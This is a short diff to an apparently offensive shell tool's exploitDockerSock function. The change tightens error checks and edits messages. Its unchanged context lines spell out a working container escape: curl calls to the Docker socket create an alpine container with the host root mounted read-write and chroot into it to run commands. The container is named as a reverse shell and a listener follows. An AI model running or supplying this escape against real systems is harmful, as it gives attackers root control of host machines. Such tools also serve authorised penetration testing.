@@ -1054,15 +1054,21 @@ exploitDockerSock() {
   payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
   response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
 
-  if ! [ $? ]; then
-    printError 'Something went wrong'
+  if ! [ "$response" ]; then
+    printError 'Could not create container'
     echo "$response"
     return
   fi
 
   revShellContainerID=$(echo "$response" | cut -d'"' -f4)
   printQuestion "Creating container ....."
-  printSuccess "$revShellContainerID"
+
+  if [ "$revShellContainerID" ]; then
+    printSuccess "$revShellContainerID"
+  else
+    printError 'Could not get container ID'
+    exit 1
+  fi
 
   startCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start"
   logsCmd="curl -s --unix-socket /var/run/docker.sock \"http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1\" --output -"
@@ -1106,7 +1112,7 @@ exploitDockerSock() {
     printError 'Something went wrong...'
   fi
 
-  printQuestion "Exploit completed ....."
+  printQuestion "Exploit completed ......"
   if [ "$listen" ]; then
     # Create listener
     printSuccess 'Switching to listener'
